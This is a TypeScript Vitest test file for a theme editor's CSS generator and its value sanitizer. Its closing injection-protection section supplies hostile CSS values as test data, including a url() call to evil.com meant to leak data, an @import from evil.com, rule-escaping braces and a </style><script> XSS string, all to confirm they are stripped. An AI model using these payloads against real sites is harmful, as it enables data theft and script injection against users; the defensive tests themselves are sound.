import { describe, it, expect } from 'vitest';
import { generateThemeCSS, sanitizeCSSValue } from './css-generator';
import { defaultLightStyles, defaultDarkStyles } from '../theme-defaults';
import { THEME_PRESETS } from '../presets';
import type { ThemeConfig } from '../theme-editor.types';

const defaultConfig: ThemeConfig = {
	light: defaultLightStyles,
	dark: defaultDarkStyles,
};

describe('generateThemeCSS', () => {
	it('generates :root block with all CSS custom properties', () => {
		const css = generateThemeCSS(defaultConfig);
		expect(css).toContain(':root {');
		expect(css).toContain(`--primary: ${defaultLightStyles.primary};`);
		expect(css).toContain(`--background: ${defaultLightStyles.background};`);
		expect(css).toContain('--font-sans:');
		expect(css).toContain(`--radius: ${defaultLightStyles.radius};`);
	});

	it('generates .dark block with overridden values only', () => {
		const css = generateThemeCSS(defaultConfig);
		expect(css).toContain('.dark {');
		// Dark primary differs from light
		expect(css).toContain(`--primary: ${defaultDarkStyles.primary};`);
		// Common keys (font-sans, radius) should NOT appear in .dark variable block
		const darkMatch = css.match(/\.dark[^{]*\{([^}]+)\}/);
		expect(darkMatch).toBeTruthy();
		const darkVars = darkMatch?.[1] ?? '';
		expect(darkVars).not.toContain('--font-sans');
		expect(darkVars).not.toContain('--radius');
	});

	it('includes component styles by default', () => {
		const css = generateThemeCSS(defaultConfig);
		expect(css).toContain('[data-slot="button"]');
		expect(css).toContain('[data-slot="input"]');
		expect(css).toContain('[data-slot="checkbox"]');
		expect(css).toContain('[data-slot="tab"]');
		expect(css).toContain('[data-slot="accordion-trigger"]');
		expect(css).toContain('[data-slot="select-trigger"]');
		expect(css).toContain('[data-slot="dialog"]');
		expect(css).toContain('[data-slot="separator"]');
		expect(css).toContain('[data-slot="progress"]');
		expect(css).toContain('[data-slot="chip"]');
		expect(css).toContain('[data-slot="label"]');
	});

	describe('covers every headless component family', () => {
		const css = generateThemeCSS(defaultConfig);

		const expectedSlots = [
			// Button + variants
			'button',
			// Form inputs
			'input',
			'textarea',
			// Selection controls
			'checkbox',
			'switch',
			'radio-group',
			'radio-item',
			// Toggle
			'toggle',
			'toggle-group',
			'toggle-item',
			// Tabs
			'tabs',
			'tab-list',
			'tab',
			'tab-panel',
			// Accordion
			'accordion',
			'accordion-item',
			'accordion-trigger',
			'accordion-content',
			// Select
			'select',
			'select-trigger',
			'select-value',
			'select-content',
			'select-item',
			// Collapsible
			'collapsible',
			'collapsible-trigger',
			'collapsible-content',
			// Dialog
			'dialog',
			'dialog-title',
			'dialog-description',
			'dialog-close',
			// Alert Dialog
			'alert-dialog',
			'alert-dialog-title',
			'alert-dialog-description',
			'alert-dialog-action',
			'alert-dialog-cancel',
			// Drawer
			'drawer',
			'drawer-title',
			'drawer-description',
			'drawer-close',
			// Toast
			'toast-container',
			'toast',
			'toast-title',
			'toast-description',
			'toast-action',
			'toast-dismiss',
			// Progress
			'progress',
			// Separator
			'separator',
			// Spinner
			'spinner',
			// Skeleton
			'skeleton',
			// Chips
			'chips',
			'chip',
			'chip-input',
			'chip-remove',
			// Field & Label
			'field',
			'label',
			'description',
			'error',
			// Menu
			'menu',
			'menu-bar',
			'menu-trigger',
			'menu-item',
			// Context Menu
			'context-menu-content',
			// Listbox
			'listbox',
			'option',
			// Combobox
			'combobox',
			'combobox-input',
			'combobox-popup',
			// Command
			'command',
			'command-input',
			'command-list',
			'command-group',
			'command-item',
			'command-empty',
			'command-separator',
			'command-dialog',
			'command-dialog-panel',
			// Popover
			'popover-content',
			// Tooltip
			'tooltip-content',
			// Hover Card
			'hover-card-content',
			// Grid
			'grid',
			'grid-row',
			'grid-cell',
			// Tree
			'tree',
			'tree-item',
			'tree-item-group',
			// Toolbar
			'toolbar',
			'toolbar-widget',
			'toolbar-widget-group',
		];

		for (const slot of expectedSlots) {
			it(`includes [data-slot="${slot}"] rule`, () => {
				expect(css).toContain(`[data-slot="${slot}"]`);
			});
		}
	});

	describe('button variants use data-variant', () => {
		const css = generateThemeCSS(defaultConfig);

		it('has secondary variant', () => {
			expect(css).toContain('[data-slot="button"][data-variant="secondary"]');
			expect(css).toContain('background: var(--secondary);');
		});

		it('has outline variant', () => {
			expect(css).toContain('[data-slot="button"][data-variant="outline"]');
		});

		it('has destructive variant', () => {
			expect(css).toContain('[data-slot="button"][data-variant="destructive"]');
			expect(css).toContain('background: var(--destructive);');
		});

		it('has ghost variant', () => {
			expect(css).toContain('[data-slot="button"][data-variant="ghost"]');
		});

		it('has link variant', () => {
			expect(css).toContain('[data-slot="button"][data-variant="link"]');
		});
	});

	describe('toast variants use data-variant', () => {
		const css = generateThemeCSS(defaultConfig);

		it('has destructive toast variant', () => {
			expect(css).toContain('[data-slot="toast"][data-variant="destructive"]');
		});

		it('has success toast variant', () => {
			expect(css).toContain('[data-slot="toast"][data-variant="success"]');
		});
	});

	describe('interactive states and pseudo-classes', () => {
		const css = generateThemeCSS(defaultConfig);

		it('includes focus-visible for interactive elements', () => {
			expect(css).toContain('[data-slot="button"]:focus-visible');
			expect(css).toContain('[data-slot="input"]:focus-visible');
			expect(css).toContain('[data-slot="checkbox"]:focus-visible');
			expect(css).toContain('[data-slot="switch"]:focus-visible');
			expect(css).toContain('[data-slot="radio-item"]:focus-visible');
			expect(css).toContain('[data-slot="tab"]:focus-visible');
			expect(css).toContain('[data-slot="toggle"]:focus-visible');
			expect(css).toContain('[data-slot="combobox-input"]:focus-visible');
		});

		it('includes hover states', () => {
			expect(css).toContain('[data-slot="button"]:hover');
			expect(css).toContain('[data-slot="accordion-trigger"]:hover');
			expect(css).toContain('[data-slot="select-item"]:hover');
			expect(css).toContain('[data-slot="menu-item"]:hover');
			expect(css).toContain('[data-slot="option"]:hover');
			expect(css).toContain('[data-slot="tree-item"]:hover');
		});

		it('includes disabled state for button', () => {
			expect(css).toContain('[data-slot="button"]:disabled');
		});

		it('includes checked/selected states', () => {
			expect(css).toContain('[data-slot="checkbox"][data-state="checked"]');
			expect(css).toContain('[data-slot="switch"][data-state="checked"]');
			expect(css).toContain('[data-slot="radio-item"][data-state="checked"]');
			expect(css).toContain('[data-slot="tab"][data-state="selected"]');
			expect(css).toContain('[data-slot="toggle"][data-state="on"]');
			expect(css).toContain('[data-slot="option"][data-state="selected"]');
			expect(css).toContain('[data-slot="tree-item"][data-state="selected"]');
		});

		it('includes placeholder pseudo-element', () => {
			expect(css).toContain('[data-slot="input"]::placeholder');
			expect(css).toContain('[data-slot="command-input"]::placeholder');
		});

		it('includes progress bar fill via ::after', () => {
			expect(css).toContain('[data-slot="progress"]::after');
			expect(css).toContain('var(--progress-value, 0)');
		});

		it('includes checkbox checkmark via ::after', () => {
			expect(css).toContain('[data-slot="checkbox"]::after');
			expect(css).toContain('[data-slot="checkbox"][data-state="checked"]::after');
		});

		it('includes switch thumb via ::after', () => {
			expect(css).toContain('[data-slot="switch"]::after');
			expect(css).toContain('[data-slot="switch"][data-state="checked"]::after');
		});

		it('includes radio dot via ::after', () => {
			expect(css).toContain('[data-slot="radio-item"]::after');
			expect(css).toContain('[data-slot="radio-item"][data-state="checked"]::after');
		});

		it('includes spinner animation via ::after', () => {
			expect(css).toContain('[data-slot="spinner"]::after');
			expect(css).toContain('spinner-rotate');
		});
	});

	it('includes skeleton animation keyframes', () => {
		const css = generateThemeCSS(defaultConfig);
		expect(css).toContain('@keyframes skeleton-pulse');
	});

	it('includes spinner animation keyframes', () => {
		const css = generateThemeCSS(defaultConfig);
		expect(css).toContain('@keyframes spinner-rotate');
	});

	it('includes separator vertical orientation', () => {
		const css = generateThemeCSS(defaultConfig);
		expect(css).toContain('[data-slot="separator"][data-orientation="vertical"]');
	});

	it('excludes component styles when includeComponentStyles is false', () => {
		const css = generateThemeCSS(defaultConfig, { includeComponentStyles: false });
		expect(css).toContain(':root {');
		expect(css).toContain('--primary');
		expect(css).not.toContain('[data-slot=');
	});

	it('scopes all selectors when scopeSelector is provided', () => {
		const css = generateThemeCSS(defaultConfig, { scopeSelector: '.theme-preview' });
		// Variables should be scoped
		expect(css).toContain('.theme-preview {');
		// Dark mode should be scoped
		expect(css).toMatch(/\.theme-preview\.dark|\.theme-preview \.dark/);
		// Component styles should be scoped
		expect(css).toContain('.theme-preview [data-slot="button"]');
		expect(css).toContain('.theme-preview [data-slot="input"]');
		// Unscoped selectors should NOT exist
		expect(css).not.toMatch(/^:root\s*\{/m);
	});

	it('references CSS variables in component styles', () => {
		const css = generateThemeCSS(defaultConfig);
		// Button uses primary colors
		expect(css).toContain('background: var(--primary);');
		expect(css).toContain('color: var(--primary-foreground);');
		// Input uses border/ring
		expect(css).toContain('border: 1px solid var(--input);');
		expect(css).toContain('outline: 2px solid var(--ring);');
		// Checkbox uses primary on checked
		expect(css).toContain('[data-slot="checkbox"][data-state="checked"]');
	});

	it('generates valid CSS structure', () => {
		const css = generateThemeCSS(defaultConfig);
		// Every { should have a matching }
		const opens = (css.match(/\{/g) ?? []).length;
		const closes = (css.match(/\}/g) ?? []).length;
		expect(opens).toBe(closes);
		// No empty rule blocks
		expect(css).not.toMatch(/\{\s*\}/);
	});

	it('includes header comment', () => {
		const css = generateThemeCSS(defaultConfig);
		expect(css).toContain('/* Momentum Headless Theme */');
	});

	it('handles identical light and dark values by producing empty dark block', () => {
		const sameConfig: ThemeConfig = {
			light: defaultLightStyles,
			dark: { ...defaultLightStyles },
		};
		const css = generateThemeCSS(sameConfig);
		expect(css).toContain(':root {');
		// Dark block should be empty/absent since all values are the same
		expect(css).not.toContain('.dark {');
	});

	describe('configuration changes propagate to output', () => {
		it('custom primary color appears in :root variables', () => {
			const config: ThemeConfig = {
				light: { ...defaultLightStyles, primary: 'oklch(0.6 0.2 250)' },
				dark: defaultDarkStyles,
			};
			const css = generateThemeCSS(config);
			expect(css).toContain('--primary: oklch(0.6 0.2 250);');
		});

		it('custom background color appears in :root variables', () => {
			const config: ThemeConfig = {
				light: { ...defaultLightStyles, background: 'oklch(0.98 0.01 200)' },
				dark: defaultDarkStyles,
			};
			const css = generateThemeCSS(config);
			expect(css).toContain('--background: oklch(0.98 0.01 200);');
		});

		it('custom font-sans appears in :root variables', () => {
			const config: ThemeConfig = {
				light: { ...defaultLightStyles, 'font-sans': "'Inter', sans-serif" },
				dark: { ...defaultDarkStyles, 'font-sans': "'Inter', sans-serif" },
			};
			const css = generateThemeCSS(config);
			expect(css).toContain("--font-sans: 'Inter', sans-serif;");
		});

		it('custom radius appears in :root variables', () => {
			const config: ThemeConfig = {
				light: { ...defaultLightStyles, radius: '1rem' },
				dark: { ...defaultDarkStyles, radius: '1rem' },
			};
			const css = generateThemeCSS(config);
			expect(css).toContain('--radius: 1rem;');
		});

		it('zero radius produces 0rem in output', () => {
			const config: ThemeConfig = {
				light: { ...defaultLightStyles, radius: '0rem' },
				dark: { ...defaultDarkStyles, radius: '0rem' },
			};
			const css = generateThemeCSS(config);
			expect(css).toContain('--radius: 0rem;');
		});

		it('custom shadow-opacity appears in :root variables', () => {
			const config: ThemeConfig = {
				light: { ...defaultLightStyles, 'shadow-opacity': '0.25' },
				dark: { ...defaultDarkStyles, 'shadow-opacity': '0.25' },
			};
			const css = generateThemeCSS(config);
			expect(css).toContain('--shadow-opacity: 0.25;');
		});

		it('custom shadow-blur appears in :root variables', () => {
			const config: ThemeConfig = {
				light: { ...defaultLightStyles, 'shadow-blur': '10px' },
				dark: { ...defaultDarkStyles, 'shadow-blur': '10px' },
			};
			const css = generateThemeCSS(config);
			expect(css).toContain('--shadow-blur: 10px;');
		});

		it('custom letter-spacing appears in :root variables', () => {
			const config: ThemeConfig = {
				light: { ...defaultLightStyles, 'letter-spacing': '0.05em' },
				dark: { ...defaultDarkStyles, 'letter-spacing': '0.05em' },
			};
			const css = generateThemeCSS(config);
			expect(css).toContain('--letter-spacing: 0.05em;');
		});

		it('custom dark primary appears in .dark block', () => {
			const config: ThemeConfig = {
				light: defaultLightStyles,
				dark: { ...defaultDarkStyles, primary: 'oklch(0.8 0.15 300)' },
			};
			const css = generateThemeCSS(config);
			expect(css).toContain('--primary: oklch(0.8 0.15 300);');
		});

		it('component styles use var() references that pick up custom values', () => {
			const config: ThemeConfig = {
				light: { ...defaultLightStyles, primary: 'oklch(0.5 0.3 270)' },
				dark: defaultDarkStyles,
			};
			const css = generateThemeCSS(config);
			// The variable block has the custom value
			expect(css).toContain('--primary: oklch(0.5 0.3 270);');
			// Component styles reference via var() — so they'll inherit the custom value
			expect(css).toContain('background: var(--primary);');
			expect(css).toContain('border-radius: var(--radius);');
			expect(css).toContain('font-family: var(--font-sans);');
		});

		it('all preset configs produce valid CSS', () => {
			for (const preset of THEME_PRESETS) {
				const config: ThemeConfig = {
					light: { ...defaultLightStyles, ...preset.styles.light },
					dark: { ...defaultDarkStyles, ...preset.styles.dark },
				};
				const css = generateThemeCSS(config);
				// Valid structure
				const opens = (css.match(/\{/g) ?? []).length;
				const closes = (css.match(/\}/g) ?? []).length;
				expect(opens).toBe(closes);
				// Has variables
				expect(css).toContain('--primary:');
				expect(css).toContain('--background:');
			}
		});
	});

	describe('CSS injection protection', () => {
		it('strips curly braces that could escape property context', () => {
			const config: ThemeConfig = {
				light: {
					...defaultLightStyles,
					primary: 'red; } body { background: url("evil") } .x { color: red',
				},
				dark: defaultDarkStyles,
			};
			const css = generateThemeCSS(config);
			// The malicious payload should be sanitized — no extra } or { in variable block
			expect(css).not.toContain('body {');
			expect(css).not.toContain('url("evil")');
		});

		it('strips url() to prevent data exfiltration', () => {
			const config: ThemeConfig = {
				light: { ...defaultLightStyles, primary: 'url(https://evil.com/steal?data=secret)' },
				dark: defaultDarkStyles,
			};
			const css = generateThemeCSS(config);
			// url( is stripped — remaining text is harmless invalid CSS value
			expect(css).not.toMatch(/url\s*\(/);
		});

		it('strips @import attempts', () => {
			const config: ThemeConfig = {
				light: { ...defaultLightStyles, primary: '@import "https://evil.com/inject.css"' },
				dark: defaultDarkStyles,
			};
			const css = generateThemeCSS(config);
			expect(css).not.toContain('@import');
		});

		it('strips expression() for IE XSS prevention', () => {
			const config: ThemeConfig = {
				light: { ...defaultLightStyles, primary: 'expression(alert(1))' },
				dark: defaultDarkStyles,
			};
			const css = generateThemeCSS(config);
			expect(css).not.toContain('expression(');
		});

		it('strips javascript: pseudo-protocol', () => {
			const config: ThemeConfig = {
				light: { ...defaultLightStyles, primary: 'javascript:alert(1)' },
				dark: defaultDarkStyles,
			};
			const css = generateThemeCSS(config);
			expect(css).not.toContain('javascript:');
		});

		it('strips semicolons that could inject extra properties', () => {
			const malicious = 'red; position: fixed; z-index: 99999';
			const sanitized = sanitizeCSSValue(malicious);
			// Semicolons stripped — can't inject separate CSS declarations
			expect(sanitized).not.toContain(';');
			// The text remains but is a single invalid value (no property injection)
			expect(sanitized).toBe('red position: fixed z-index: 99999');
		});

		it('strips backslash escapes used to bypass filters', () => {
			const config: ThemeConfig = {
				light: { ...defaultLightStyles, primary: 'u\\72l(https://evil.com)' },
				dark: defaultDarkStyles,
			};
			const css = generateThemeCSS(config);
			expect(css).not.toContain('\\');
		});

		it('strips HTML comment markers', () => {
			const config: ThemeConfig = {
				light: { ...defaultLightStyles, primary: 'red <!-- -->' },
				dark: defaultDarkStyles,
			};
			const css = generateThemeCSS(config);
			expect(css).not.toContain('<!--');
			expect(css).not.toContain('-->');
		});

		it('strips var() references to prevent variable injection chains', () => {
			const config: ThemeConfig = {
				light: { ...defaultLightStyles, primary: 'var(--malicious-value)' },
				dark: defaultDarkStyles,
			};
			const css = generateThemeCSS(config);
			expect(css).not.toMatch(/--primary:.*var\(/);
		});

		it('preserves valid OKLCH color values', () => {
			const validColor = 'oklch(0.5 0.2 250)';
			expect(sanitizeCSSValue(validColor)).toBe(validColor);
		});

		it('preserves valid hex colors', () => {
			expect(sanitizeCSSValue('#ff0000')).toBe('#ff0000');
		});

		it('preserves valid rgb colors', () => {
			expect(sanitizeCSSValue('rgb(255, 0, 0)')).toBe('rgb(255, 0, 0)');
		});

		it('preserves valid rem/px values', () => {
			expect(sanitizeCSSValue('0.625rem')).toBe('0.625rem');
			expect(sanitizeCSSValue('10px')).toBe('10px');
		});

		it('preserves valid font stacks', () => {
			const fontStack = "'Inter', system-ui, sans-serif";
			expect(sanitizeCSSValue(fontStack)).toBe(fontStack);
		});

		it('returns empty string for completely malicious input', () => {
			expect(sanitizeCSSValue('{}')).toBe('');
		});

		it('handles empty string input', () => {
			expect(sanitizeCSSValue('')).toBe('');
		});

		it('strips CSS-in-HTML injection via angle brackets', () => {
			const config: ThemeConfig = {
				light: { ...defaultLightStyles, primary: 'red</style><script>alert(1)</script>' },
				dark: defaultDarkStyles,
			};
			const css = generateThemeCSS(config);
			expect(css).not.toContain('<script>');
			expect(css).not.toContain('</style>');
		});

		it('also sanitizes dark mode values', () => {
			const config: ThemeConfig = {
				light: defaultLightStyles,
				dark: { ...defaultDarkStyles, primary: 'red; } .steal { background: url("evil") }' },
			};
			const css = generateThemeCSS(config);
			expect(css).not.toContain('url(');
			// Structural injection chars are stripped — no rule escape possible
			const darkMatch = css.match(/\.dark[^{]*\{([^}]+)\}/);
			if (!darkMatch) throw new Error('.dark block not found in generated CSS');
			expect(darkMatch[1]).not.toContain('{');
		});

		it('sanitizes CSS property key names too', () => {
			// Keys come from ThemeStyleProps interface so this is type-enforced,
			// but the generator should still sanitize when interpolating
			const css = generateThemeCSS(defaultConfig);
			// Match only variable declarations (lines starting with --)
			const varMatches = css.matchAll(/^\s+--([\w-]+):/gm);
			for (const match of varMatches) {
				expect(match[1]).toMatch(/^[a-zA-Z0-9-]+$/);
			}
		});
	});
});
